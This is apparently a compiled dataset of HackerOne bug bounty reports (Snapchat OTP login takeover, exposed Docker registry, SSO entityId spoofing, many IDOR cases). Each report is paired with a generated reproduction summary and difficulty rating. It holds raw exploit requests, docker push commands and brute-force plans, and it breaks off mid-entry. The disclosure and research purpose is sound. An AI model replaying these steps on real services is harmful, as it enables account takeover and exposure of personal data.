3content-type: application/json;charset=utf-8
4vary: Accept-Encoding
5x-cloud-trace-context: 4ea579062bff12ec2ef2162a59116f2e
6server: API Gateway
7cache-control: no-cache, no-store
8x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
9x-snapchat-request-id: █████
10x-snapchat-server-latency: 342
11strict-transport-security: max-age=31536000; includeSubDomains
12Via: 1.1 google, 1.1 google
13Alt-Svc: h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"
14Connection: close
15Content-Length: 137
16
17{"status":"SUCCESS","user_id":"█████████","token":"█████","expiry_hint":████}
Notice an attacker replaced user_id with victim's user_id and the server responded with victim's user_id and given us otp token. Now let's login with the token.
Attacker performs /scauth/otp/login request with username equal victim's username, and the token obtained on previous step.
Code 756 Bytes
1POST /scauth/otp/login HTTP/1.1
2Host: gcp.api.snapchat.com
3Connection: close
4Content-Length: 6213
5X-Snapchat-Client-Auth: ██████
6X-Snapchat-UUID: ████████
7User-Agent: Snapchat/10.78.1.0 ██████
8Accept: application/json
9Accept-Language: en-GB;q=1, en;q=0.9
10Content-Type: application/x-www-form-urlencoded; charset=utf-8
11Accept-Encoding: gzip, deflate
12
13application_id=com.snap.framework&attestation=████████&device_id=█████████&dsig=█████&dtoken1i=██████&fidelius_client_init=███████&height=1920&max_video_height=1920&max_video_width=1080&password=███████&reactivation_confirmed=false&req_token=████████&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=████&username=█████&width=1080
response
Code 738 Bytes
1HTTP/1.1 200 OK
2date: Mon, 13 Jul 2020 01:40:18 GMT
3content-type: application/json;charset=utf-8
4vary: Accept-Encoding,Accept-Encoding
5x-cloud-trace-context: f88a46255f8542b12008295d77cf1b5c
6server: API Gateway
7cache-control: no-cache, no-store
8x-snap-refresh-token: ████
9x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.
10x-snap-access-tokens: ███
11x-snapchat-request-id: ████████
12strict-transport-security: max-age=31536000; includeSubDomains
13Via: 1.1 google, 1.1 google
14Alt-Svc: h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"
15Connection: close
16Content-Length: 138867
17
18{"updates_response":{"logged":true,"username":"█████","user_id":"█████",...
An attacker successfully performed login as victim.
Victim's user_id can be easily obtained with friends request.
I've attached the following:
a screencast to showcase the problem.
burp project ████
logout+login raw requests exported from burp
a python script to perform the attack
I've tested this bug only on my personal accounts.
███████
███
█████████
Impact
An attacker is able to login as any user.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to impersonate any user by manipulating the user_id parameter in the logout request to obtain a valid OTP token for the victim's account, which can then be used to log in as the victim.

Steps to Reproduce:
1. Attacker logs into their own account normally.
2. Attacker sends a POST request to '/scauth/otp/droid/logout' with the victim's user_id instead of their own.
3. Server responds with a token for the victim's account.
4. Attacker uses the obtained token to send a POST request to '/scauth/otp/login' with the victim's username.
5. Attacker successfully logs in as the victim.
Exploitation Difficulty:
The attack involves understanding the OTP authentication flow, manipulating the logout request to target a victim's account, and then using the obtained token to log in. While the steps are straightforward, the interaction between the logout and login processes is non-obvious and requires knowledge of how the OTP tokens are generated and validated.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/924487: Exposed Docker Registry at https://████
================================================================================
RAW DESCRIPTION:

Summary:
The docker registry at https://██████ has no authentication in place and is therefore exposed to the public. This leads to full disclosure of all available docker containers, the possibility to upload docker container and manipulate and delete existing docker containers.
Description:
From https://www.acunetix.com/vulnerabilities/web/docker-registry-api-is-accessible-without-authentication/ :
The Docker Registry HTTP API is the protocol to facilitate the distribution of images to the docker engine. It interacts with instances of the docker registry, which is a service to manage information about docker images and enable their distribution.
This Docker Registry API is accessible without authentication. A properly secured registry should return 401 when the "/v2/" endpoint is hit without credentials. The response should include a WWW-Authenticate challenge, guiding how to authenticate, such as with basic auth or a token service.
Impact
High. An attacker can view all available (deployed) docker containers and their containing information, patch the containers to transform the containers to malicious containers (backdoors, malfunction, authentication bypass, RCE, etc.) and upload new possibly malicious containers.
Step-by-step Reproduction Instructions
Viewing and Downloading existing docker containers
We can examine the existing docker containers by visiting https://██████████/v2/_catalog. We can see that multiple "private" custom docker containers are available (refer to docker_catalog.png)
We can download any of these containers with the following command docker pull █████/<container>. For example we can download the container █████████ with docker pull ███████/███ (refer to shell_download_container.png)
At this point we can start the container with docker run --rm -it █████████/█████ sh and investigate what is inside the container, to look for credentials and other useful information, etc. (refer to shell_inside_container.png)
Uploading containers
We can not only view all the information in the existing containers, but we are also able to upload containers.
As a proof of concept, I uploaded the default hello-world container
Code 183 Bytes
1docker pull hello-world   # Get the hello-world docker
2docker tag hello-world:latest ██████/chron0x/hello-world   # Set destination
3docker push █████████/chron0x/hello-world   # Push 
Carefully observing https://█████/v2/_catalog we can see that the container chron0x/hello-world is present (refer to docker_catalog_chron0x.png) . The uploaded container is succesfully uploaded and would now be executed server-side.
Manipulating existing dockers
Combining the two points above it is also possible to manipulate existing docker containers, by
Downloading an existing container
Patching the container
Uploading the container again
With such manipulations backdoors can be planted, the server can be taken over completely, authentications can be bypassed, forced into malfunction etc.
I did not manipulate any of the existing containers since I did not want to mess with the system. I can of course present a manipulation, like planting a file into one of the containers on request.
Product, Version, and Configuration (If applicable)
Docker Registry v2
Suggested Mitigation/Remediation Actions
Restrict access to the Docker Registry API. Except for registries running on secure local networks, registries should always implement access restrictions.
The simplest way to achieve access restriction is through basic authentication (this is very similar to other web servers basic authentication mechanism).
Check all existing docker containers for manipulations, or set them up again from scratch, since they have been potentially been tampered with.
Resources:
https://www.acunetix.com/vulnerabilities/web/docker-registry-api-is-accessible-without-authentication/
https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/
Impact
High. An attacker can view all available (deployed) docker containers and their containing information, patch the containers to transform the containers to malicious containers (backdoors, malfunction, authentication bypass, RCE, DDOS etc.) and upload new possibly malicious containers.



================================================================================
Vulnerability Description:
The Docker Registry at https://██████ is exposed to the public without authentication, allowing unauthorized users to view, download, modify, and upload containers. This can lead to information disclosure, container manipulation, and potential system compromise.

Steps to Reproduce:
1. Access the Docker Registry API endpoint at https://██████/v2/_catalog to view available containers
2. Use docker commands to pull, modify, and push containers to the registry
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves accessing a well-known Docker Registry endpoint and using standard Docker commands. No complex interactions or novel logic are required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/970157: Bypass Password Authentication to Update the Password
================================================================================
RAW DESCRIPTION:

Summary:This additional security measure from twitter provides protection to the victim's account, considering that a victim's session may have been hijacked by a hacker, however, due to this additional layer of security Implemented by twitter the hacker would not be able to change the victim's Password, as they will be prompted to enter the victim's account password In order to make these changes, which will not be known to a hacker (In case of a session hijack)
This report is to bring to your attention a security vulnerability that will allow hackers that have hijacked a user's session to bypass the password screen (Without knowing the user's password)
Description: For users that have had their twitter session hijacked, this security vulnerability would enable a hacker to completely take over a victim's account as they will be able to change the victim's password by bypassing the old password by the umrestricted rate limit or bruteforcing in the password
Steps To Reproduce:
With the assumption that the victim's twitter session is 'hijacked' and in a 'logged in' state for the hacker. The below steps must be followed In order to reproduce the security vulnerability.
Security Vulnerability #1 - Update Victim's Password - Bypass old password by unrestricted rate limiting
1.Go to Settings and Privacy -> Accounts
2.Click on Email -> Password
3.Enter any random password and Click on 'Next'
4.Intercept the request the above request and send it to intruder
5.Then select the position old password
6.Then go in payload add password list
7.Then start the attack bcoz of no rate limit the password bruteforcing is continue and find the correct password and update the old one
Resolution: Apply the Rate Limitation
Supporting Material/References:
Impact
This a serious security vulnerability, as It could lead to a hacker completely taking over the user's account by overriding twitter's security protocol as they could use this technique to bypass the password and it use to fully takeover the victim password



================================================================================
Vulnerability Description:
This vulnerability allows an attacker with a hijacked session to bypass the old password requirement and brute-force the victim's password due to unrestricted rate limiting on the password change endpoint.

Steps to Reproduce:
1. Go to Settings and Privacy -> Accounts
2. Click on Email -> Password
3. Enter any random password and Click on 'Next'
4. Intercept the request and send it to intruder
5. Select the position of the old password
6. Add a password list in the payload
7. Start the attack due to no rate limit, allowing brute-forcing to find the correct password and update it
Exploitation Difficulty:
The attack involves intercepting and manipulating a request, but the core issue (lack of rate limiting) is a common and well-known security flaw. The steps are straightforward once the attacker has session access.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/976603: Ability to DOS any organization's SSO and open up the door to account takeovers
================================================================================
RAW DESCRIPTION:

Summary:
There's an interesting issue I've spent quite a few days trying to escalate but can't figure out. The impact at this point is that I can DOS any SSO integration making it so nobody in that organization can login. I can also get users to inadvertently SSO into my attacker organization, and then take over their account from there. For existing accounts this would require a victim to click "join", however I think that's likely given the fact that they are SSOing for the first time expecting to join an organization.
The strange behavior and why I think it might be possible to escalate further, is that I can have you authenticate against one SSO instance, but have you get added to a completely separate one. So that means there is some sketchy logic which can potentially allow an attacker to authenticate against their own SSO instance, and get added to someone else's organization. I'm not sure if it's possible to get this with zero user interaction, but I will keep trying and update the report if I figure out a way.
The bug stems from the fact that you can create an entityId identical to that of another organization except with a space at the end. The application logic then prioritizes that new entityId to add the user to after authenticating against the correct one. So if you have myentity as the legitimate entity, and an attacker sets their entity to myentity[SPACE] (with a space at the end); users attempting to authenticate into the legitimate myentity will technically authenticate against it, but then the application attempts to log them into the attacker's organization. The result of this is a DOS since legitimate users can no longer access their organization. The interesting part of the bug is that if the user is deleted from their original organization (or a new user attempts to SSO), they will then be authenticating against their original organization, but get added into the attacker's organization. So it seems the SAML Response is checked against a trim(issuer), but when trying to place the user into an organization, the entity with the space is always prioritized.
The steps below will demonstrate this behavior:
Steps To Reproduce:
Setup SSO and confirm you can login.
Create a new Grammarly business account and use the same entityId (Identity Provider Issuer) you used in step 1, except add a space to the end of it. Use a different keypair for this organization as well.
Wait 2 minutes for the change to propagate, then try logging into the same account from step 1, and notice you now get an error.
At this point the victim organization is DOS'd. To confirm the strange behavior discussed above, you can delete that user from the victim organization and attempt to login again. Notice you will now end up getting provisioned to the attacker's organization, even though you signed the SAML Response with the victim organization's private key.
Once you are provisioned into the attacker's organization, the attacker can then change their entityId to something brand new, and login to the victim's account using the keypair they own. If this was a converted personal account, you can then access that user's personal documents.
Impact
Ability to effectively disable SSO for any organization.
Ability to get users provisioned into an attacker's account, which they can then takeover.
Thanks,
-- Tanner



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to DoS any organization's SSO by creating a duplicate entityId with a trailing space, which the system incorrectly prioritizes. Additionally, users authenticating against the legitimate SSO can be redirected to the attacker's organization, enabling account takeover under certain conditions.

Steps to Reproduce:
1. Setup SSO and confirm you can login.
2. Create a new Grammarly business account with the same entityId as the target organization, but add a space at the end. Use a different keypair.
3. Wait 2 minutes for the change to propagate, then attempt to login to the target organization. Observe the error, confirming the DoS.
4. Delete the user from the victim organization and attempt to login again. The user is now provisioned into the attacker's organization.
5. The attacker can then change their entityId and use their keypair to login to the victim's account, potentially accessing personal documents.
Exploitation Difficulty:
The attack involves understanding and manipulating SAML authentication flows, exploiting a subtle logic flaw in entityId comparison (trim vs. non-trim), and requires setting up a malicious SSO instance with specific configurations. The interaction between these components is non-obvious and requires deep knowledge of SSO implementations.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/986459: Recently change email but still login with old email
================================================================================
RAW DESCRIPTION:

Hi team,
I have been found vulnerability on email verification which can be account takeover (Authentication bypass)
Recently I have been change my email ████ but still login with old email ██████
--https://efss.qloud.my/index.php/settings/user
Impact
Impact
If victim's email account is still logged into his/her old gmail account . Then any external attacker can use the unused same email for account takeover
https://efss.qloud.my/index.php/settings/user



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to bypass email verification and potentially take over an account by using an old email address that was previously associated with the account but has since been changed. This occurs because the system fails to invalidate the old email address for authentication purposes after an email change.

Steps to Reproduce:
1. Log in to the application with the old email address that was previously associated with the account.
2. Observe that the system still allows authentication with the old email despite it being changed in the user settings.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it only requires the tester to attempt logging in with an old email address after changing it in the user settings. There are no complex interactions or states involved, and the logic flaw is relatively obvious once the email change process is understood.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/99600: Urgent : Unauthorised Access to Media content of all Direct messages and protected tweets(Indirect object reference)
================================================================================
RAW DESCRIPTION:

Hi Team,
You can tweet from your ad account while creating a campaign.When you add a media content from your computer and upload it there is a Json request which gives you the link of your media(Photos) to preview before Tweeting.This link is Vulnerable to IDOR Attack and it leads to disclose all the media content of twitter.I have checked and verified that it discloses the media content of any user's Direct messages and also protected tweets.
Vulnerable HTTP request :
GET /mediaid_to_cdn_url.json?media_id=[Media_id]&=1447455982153 HTTP/1.1
Host: ads.twitter.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: https://ads.twitter.com/accounts/18ce53x5krr/campaigns/5936943/copy?campaign_type=followers&promoted_account=true&source=campaign_dashboard
Cookie: [Cookie_values]
Connection: keep-alive
Here Media_id is vulnerable to IDOR attack and it leads to give you the exact link of the Media content(Photos).
For more Information I am providing Video POC :
Link : https://youtu.be/GMZgEqej61M
This is a critical issue ,Kindly Fix it in priority.
Best Regards !
Vijay Kumar





================================================================================
Vulnerability Description:
The vulnerability is an Insecure Direct Object Reference (IDOR) in Twitter's media handling system, where manipulating the 'media_id' parameter in a JSON request allows unauthorized access to media content from any user's direct messages or protected tweets.

Steps to Reproduce:
1. Log in to Twitter Ads account and navigate to campaign creation page.
2. Upload a media file (photo) and observe the JSON request that generates a preview link for the media.
3. Manipulate the 'media_id' parameter in the GET request to access media content from other users' direct messages or protected tweets.
Exploitation Difficulty:
The vulnerability involves a straightforward manipulation of a single parameter (media_id) in a predictable endpoint. The attack does not require understanding of complex application states or novel logic, making it relatively easy to discover once the endpoint is identified.

--------------------------------------------------------------------------------



Insecure Direct Object Reference (IDOR) Vulnerabilities (45 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1004745: View another user information with IDOR vulnerability 
================================================================================
RAW DESCRIPTION:

1- Navigate to the system. (https://██████████/login.php)
2- Navigate to register page. (https://██████████████/register.php)(i created user, username:██████ pass: TEst.123.!)
3- Login to the system. (https://███/login.php)
4- Navigate to "My Profile Page".
5- Intercept the request.
6- Change the "UID2=4820038" cookie value with "UID2=4820036".
7- Send the request to server.
8- View another user information.
Impact
I can view another user information.



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to view another user's information by manipulating the 'UID2' cookie value in the request, exploiting an Insecure Direct Object Reference (IDOR) issue.

Steps to Reproduce:
1. Navigate to the system and register a new user.
2. Log in and intercept the request on the 'My Profile Page'.
3. Modify the 'UID2' cookie value to another user's ID and send the request.
4. Observe the response containing another user's information.
Exploitation Difficulty:
The attack involves straightforward steps of intercepting and modifying a single cookie value, which is a common and well-documented vulnerability pattern. No complex interactions or novel logic is required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1004750: IDOR + Account Takeover  [UNAUTHENTICATED]
================================================================================
RAW DESCRIPTION:

1- Open the burp suite.
2- Switch the "Repeater" tab.
3- Paste the content of the attached request into the repeater.
4- Replace the "UID2 = 4820041" value in the cookie with the ID value of the user to be attacked. Also write the user's email in the "userName" input.
5- Replace the victim user's password
Note: Follow the steps in the "1004745" report to get the user's email address.
Impact
You can change users' passwords and take over their account.



================================================================================
Vulnerability Description:
This vulnerability allows an unauthenticated attacker to change users' passwords and take over their accounts by exploiting an Insecure Direct Object Reference (IDOR) issue. The attacker manipulates the UID2 cookie and userName input to target a specific user and change their password without proper authorization.

Steps to Reproduce:
1. Open Burp Suite and switch to the 'Repeater' tab.
2. Paste the content of the attached request into the repeater.
3. Replace the 'UID2 = 4820041' value in the cookie with the ID value of the user to be attacked and write the user's email in the 'userName' input.
4. Replace the victim user's password in the request.
5. Follow the steps in the '1004745' report to get the user's email address if not already known.
Exploitation Difficulty:
The attack involves manipulating a single parameter (UID2) in the cookie and requires knowledge of the victim's email address, which can be obtained from another report. The steps are straightforward and do not involve complex interactions or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1061292: TAMS registration details API for admins open at https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/
================================================================================
RAW DESCRIPTION:

Summary:
TAMS administrators are supposed to approve or deny all registration requests. The dashboard that shows these administrators details of a registration request calls the endpoint https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/(REGISTRATION_ID), where (REGISTRATION_ID) is numeric.
This endpoint will, without authentication, return the email, address, phone, attachment IDs, address, corporate info, and user roles. It will also return their request status and denial reason if applicable.
Attachments can then be viewed unauthenticated through https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/(ATTACHMENT_ID).
Steps To Reproduce:
Navigate to the following URL: https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/2634
For attachments, navigate to the following URL: https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/600
Recommended Mitigation:
Only allow users with valid JWT tokens for the admin role view these two endpoints.
Impact
An unauthorized attacker can view personal information about contractors and employees gaining access to TAMS.



================================================================================
Vulnerability Description:
This vulnerability involves an information disclosure issue where sensitive personal data (email, address, phone, attachments, etc.) of users pending registration approval can be accessed without authentication. Additionally, attachments can be viewed unauthenticated by directly accessing their URLs.

Steps to Reproduce:
1. Navigate to the following URL: https://tamsapi.gsa.gov/user/tams/api/usermgmnt/pendingUserDetails/2634
2. For attachments, navigate to the following URL: https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/600
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves directly accessing URLs without any authentication or complex manipulation. The steps are simple and do not require understanding of multiple components or subtle interactions.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1085782: █████████ IDOR leads to disclosure of PHI/PII
================================================================================
RAW DESCRIPTION:

Summary:
████ is designed in a way where there is a vulnerable endpoint that allows a non-medical user to view the ██████████ records of people who are not ████████s of the sponsor.
Description:
I am currently an Active Duty Airman and this vulnerability does require CAC authentication. When browsing the ██████ website with a proxy I noticed that there is a function that allows sponsors (in this case me) to view their █████s shot records in PDF form. After viewing my ██████████'s shot records, I noticed this functionality lives on the following endpoint https://████=[id]. If you increment or decrement the ██████ parameter by 1 the application will throw an HTTP Status Code 302 and redirect you back to the ██████████ endpoint which is a good security practice. The issue with this is, that with the 302 redirect the PDF of the incremented ID will be attached in the body of the 302 requests, you are able to extract this when using a proxy like Burp Suite. Obviously, this is concerning because this would allow a user to pull any shot record without being associated with medical.
Step-by-step Reproduction Instructions
I have redacted the screenshots as best as possible. The screenshots are of my information, the example for validation.
Navigate to ████/█████ and login with CAC
Once you are authenticated browse to this endpoint, https://███████=█████████ and you should be redirected to █████ but the 302 redirect will have the PDF information of my daughter (no actual ██████████ information is loaded).
On the 302 redirects, you can utilize the function Copy to File in burp suite to save this request as a pdf and you will have a PDF version of my ██████ shot record.
Please review the attached screenshot, I did not pull use my █████ information for this screenshot because I have authorized to view her information. This request shows me decrementing the ██████ by 1 and showing the PDF is attached to the 302 redirects.
██████
Suggested Mitigation/Remediation Actions
Enforce the same permissions that are used for the ██████████ and ████ functions of the application.
I am more than willing to speak with the developers about this if they want to e-mail my NIPR email. I took care to not go any further than just validating that the vulnerability exists and immediately stopped and started to write this report.
Impact
PHI/PII disclosure which includes, ████████



================================================================================
Vulnerability Description:
The vulnerability is an Insecure Direct Object Reference (IDOR) that allows a non-medical user to view Protected Health Information (PHI) and Personally Identifiable Information (PII) by manipulating the ID parameter in a URL. Although the application correctly redirects with a 302 status code, the PDF data is still included in the response body, which can be extracted using a proxy.

Steps to Reproduce:
1. Navigate to the target website and log in with CAC authentication.
2. Access the endpoint https://███████=█████████ and observe the 302 redirect response containing the PDF data in the body.
3. Use a proxy like Burp Suite to intercept the response and save the PDF file from the 302 redirect.
Exploitation Difficulty:
The attack involves manipulating a URL parameter to access unauthorized data, which is a straightforward technique. The subtlety lies in the fact that the PDF data is included in the 302 redirect response, which is not immediately obvious but can be discovered with basic proxy usage.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1096560: Ability to add arbitrary images/descriptions/titles to ohter people's issues via IDOR on getrevue.co
================================================================================
RAW DESCRIPTION:

Summary:
Hi team,
I discovered a vulnerability that allows an attacker to add arbitrary images/descriptions/titles to other people's issues via IDOR
Description:
It's possible to perform a IDOR attacker on getrevue.cowhen adding a image to your issue it's also possible to add descriptions and more to other people's issue
Steps To Reproduce:
Go to getrevue.co and Sign In
Click on Issues then Click on Add new issue
Go to the Issue that you created and from the bottom of the page Click on Media
Turn on the Intercept and Upload image
On the request change the ID to your other account's issue ID
Request:
Code 1.09 KiB
1POST /app/items HTTP/1.1
2Host: www.getrevue.co
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
4Accept: application/json, text/javascript, */*; q=0.01
5Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
6Accept-Encoding: gzip, deflate
7Referer: https://www.getrevue.co/app/issues/current
8X-CSRF-Token: qbWPNjfb12c1Plj7WrYDYgQFgWl2IaZr6/Qr/Vf5WyaDGyf68jn1mzx3xwtgFxBBX19RkHs/YHiREA7Ae6PGqg==
9Content-Type: application/json
10X-Requested-With: XMLHttpRequest
11Content-Length: 519
12Origin: https://www.getrevue.co
13Connection: close
14Cookie: [YOUR_COOKIE]
15
<image_0>
POC video:
Impact
Ability to add arbitrary images/descriptions/titles to other people's issues
It's possible to hijack other people's issues



================================================================================
Vulnerability Description:
An Insecure Direct Object Reference (IDOR) vulnerability allows an attacker to add arbitrary images, descriptions, and titles to other users' issues by manipulating the issue ID in the upload request.

Steps to Reproduce:
1. Sign in to getrevue.co
2. Create a new issue and navigate to the 'Media' section
3. Intercept the image upload request using a proxy tool
4. Modify the issue ID in the request to target another user's issue
5. Forward the modified request to upload the image to the target issue
Exploitation Difficulty:
The vulnerability involves a straightforward manipulation of a request parameter (issue ID) without requiring complex interactions or understanding of multiple components. The attack is simple to execute once the parameter to manipulate is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1196976: IDOR while uploading ████ attachments at [█████████]
================================================================================
RAW DESCRIPTION:

Description:
There is an IDOR vulnerability in uploading attachments to the ████ section where an attacker can upload attachments in other user's █████████ if there is no attachment uploaded by a user. If this vulnerability will be used with a Race condition, it can allow an attacker to upload attachments in all-new █████████ created by users.
Impact
A user can upload attachments to other users ███.
System Host(s)
██████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
Go to ██████
Login
Go to https://███/█████
Add a new █████████ and upload an attachment with that and submit it.
Send the request to the repeater.
████
6. Change the ███Id parameter value to the victim user's ██████████ id.
█████████
7. Click on the send button and you will see success in response.
8. It will be uploaded in the victim user █████ section.
Suggested Mitigation/Remediation Actions



================================================================================
Vulnerability Description:
An Insecure Direct Object Reference (IDOR) vulnerability allows an attacker to upload attachments to other users' sections if those users have not yet uploaded any attachments. When combined with a race condition, this could enable mass exploitation across new user entries.

Steps to Reproduce:
1. Go to the target website and log in.
2. Navigate to the section where attachments can be uploaded.
3. Create a new entry and upload an attachment, then submit it.
4. Capture the request in a tool like Burp Repeater.
5. Modify the request to change the user ID parameter to a victim's ID.
6. Send the modified request and observe the successful upload to the victim's section.
Exploitation Difficulty:
The vulnerability involves understanding the IDOR flaw and the potential for race condition exploitation, but the steps to reproduce are straightforward once the parameter manipulation is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1272478: IDOR Leads To Account Takeover Without User Interaction
================================================================================
RAW DESCRIPTION:

Summary:
Hello Team,
There's IDOR Bug on this subdomain mtnmobad.mtnbusiness.com.ng leads to account takeover, More details check the Poc.
Steps To Reproduce:
Create two accounts on mtnmobad.mtnbusiness.com.ng and both accounts verify the emails from your email inbox
<image_0>
Login to Victim account on browser B do the same to get the victim ID you can Grab his ID without sending this request to Repeater
Go to the Attacker Request You sent to Repeater Change /ID with the Victim's ID you Grabbed From Step 3 Then change Email with different email, you need to change the username parameter not the email see this screenshot, Leave the email as your attacker email. the username Value is email and just update that one.
<image_1>
Supporting Material/References:
Impact
Full account Takeover without user interaction



================================================================================
Vulnerability Description:
An Insecure Direct Object Reference (IDOR) vulnerability on mtnmobad.mtnbusiness.com.ng allows an attacker to take over a victim's account by manipulating the victim's ID and email parameters in a request, without requiring any interaction from the victim.

Steps to Reproduce:
1. Create two accounts on mtnmobad.mtnbusiness.com.ng and verify both emails from the inbox.
2. Login to the victim account (Browser B) and grab the victim's ID from the request.
3. Use the attacker's request in Repeater, replace the ID with the victim's ID, and change the username parameter (not the email) to the attacker's email.
4. Send the modified request to update the victim's account details, leading to account takeover.
Exploitation Difficulty:
The vulnerability involves straightforward manipulation of request parameters (ID and username) without complex interactions or novel logic. The steps are clear and do not require deep understanding of the application's state or architecture.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1410498: IDOR: leak buyer info & Publish/Hide foreign comments
================================================================================
RAW DESCRIPTION:

HI @judgeme!
I noticed that the attacker can learn email users who left feedback at the time of buying.
Step to reproduce:
Login to our store and install your 'Checkout Comments' addon
Make fake order in or store and write a comment
███
Then go to our Shopify /admin/apps/checkout-comments/extensions/checkout_comments/comments
Publish our comment and Intercept request with burp. Send request to Repeater. Request example:
POST /extensions/checkout_comments/curate_comment HTTP/1.1
Host: judge.me
Cookie: _judgeme_session=████████████████; _ga=GA1.2.1935027813.1637882690; _gid=GA1.2.2043288340.1637882690; _fbp=fb.1.1637882690590.2069272048; _gat_UA-28424713-2=1
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://judge.me/extensions/checkout_comments/comments?platform=shopify&shop_domain=test-hackerone-glis.myshopify.com&page=3&offset=50
X-Csrf-Token: ████==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 23
Origin: https://judge.me
Te: trailers
Connection: close
comment_id=1&curated=ok
Edit comment_id=random_id and in Response we can see buyer information (for example):
{"comment":{"id":1,"content":"classic dress watch for weddings","created_at":"over 3 years ago","product":{"title":"Dress Watch","url":"https://████.myshopify.com/products/dress-watch"},"buyer":{"name":"F F","email":"██████████@gmail.com"},"published_status":true,"published_status_text":"Published","curated":"ok"}}
██████
Video POC:
██████
Impact
Buyer information leaks and other



================================================================================
Vulnerability Description:
The vulnerability is an Insecure Direct Object Reference (IDOR) that allows an attacker to access sensitive buyer information by manipulating the comment_id parameter in a request. This leads to unauthorized disclosure of personal data such as email addresses and names associated with comments.

Steps to Reproduce:
1. Login to the store and install the 'Checkout Comments' addon
2. Make a fake order and leave a comment
3. Navigate to the comments section in the admin panel and publish the comment
4. Intercept the request with Burp and modify the comment_id parameter to a random ID
5. Observe the response containing buyer information
Exploitation Difficulty:
The attack involves understanding the application flow, intercepting and modifying requests, and recognizing the potential for IDOR. While the steps are straightforward, the need to use tools like Burp and the understanding of request manipulation adds some complexity.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1448550: Remove Every User, Admin, And Owner Out Of Their Teams on developers.mtn.com via IDOR + Information Disclosure
================================================================================
RAW DESCRIPTION:

Hello world,
This vulnerability is too involved with regular users, in order for us to prevent any damage, we need 3 different user accounts we own.
This gives us specific "user_id" and "team_id" to work with.
There's an Information Disclosure as a side effect of this vulnerability. User and team names are disclosed in the response from the server.
Steps To Reproduce(POC)
First, let's paint a mental picture of this vulnerability and the required conditions using accounts with imaginary user_id & team_id.
The vulnerability and conditions are realistic, the only imaginary thing is the user_id and team_id.
Create 3 accounts on developers.mtn.com(Account A, B, and C)
My imaginary accounts:
A: First Account(imaginary user_id=1111 & team_id=0001)
B: Second Account(imaginary user_id=1112 & team_id=0002)
C: Third Account(imaginary user_id=1113 & team_id=0003)
Login to A, Invite B to your Team A
Login to B, Invite C to your team B
Open Burp Suite
Login to A, Remove B(Please Intercept This Request)
Send the Intercepted request to the repeater tab
Modify the request(Our Goal is to remove C from Team B, which we don't have access or permissions to.)
Replace the team_id with Team B's team_id. Replace the user_id with C's user_id.
Send the Request. (This Request will disclose C's username And Team B's name. Making this an information disclosure. PII)
C will be removed from B's Team B.
C will receive an email from MTN telling him/her that he/she has been removed from Team B.
<image_0>
Steps To Reproduce(Removing Every User)
This can be done with a custom script/code without the need for Burp Suite
Intercept the request for removing a user, and send it to the Burp Suite intercept tab.
Config your settings to brute-force through every team_id and user_id. This part is not that hard because every user_id and team_id has only 4 digits.
Run the intruder request. When there's a successful user_id and team_id match, the user whose ID has been matched, will be removed.
If my calculations are correct, it should take 12 Hours to remove every user from every group they're in, the maximum being 20 Hours. The faster the internet speed, the faster the computer, the shorter the time it'll take to brute-force through every user_id and team_id.
Exploitability
Anyone with an account on developers.mtn.com can exploit this vulnerability
All you need is a user_id and a team_id to remove a user from his/her team.(Their privileges don't matter, even the owner is vulnerable)
Remediation
Ensure proper session management and object-level user access control checks.
Apply access control mechanisms such as permissions to certain action.
Validation of access to a team_id.
You should always check if a user submitting the request isn't tampering and isn't submitting any ID's that do not belong to his/her account.
Reference
#1448475
Impact
A low level user can remove his Admin and Owner from the team.
Every user will be removed from every team they are in, including owners and admins.



================================================================================
Vulnerability Description:
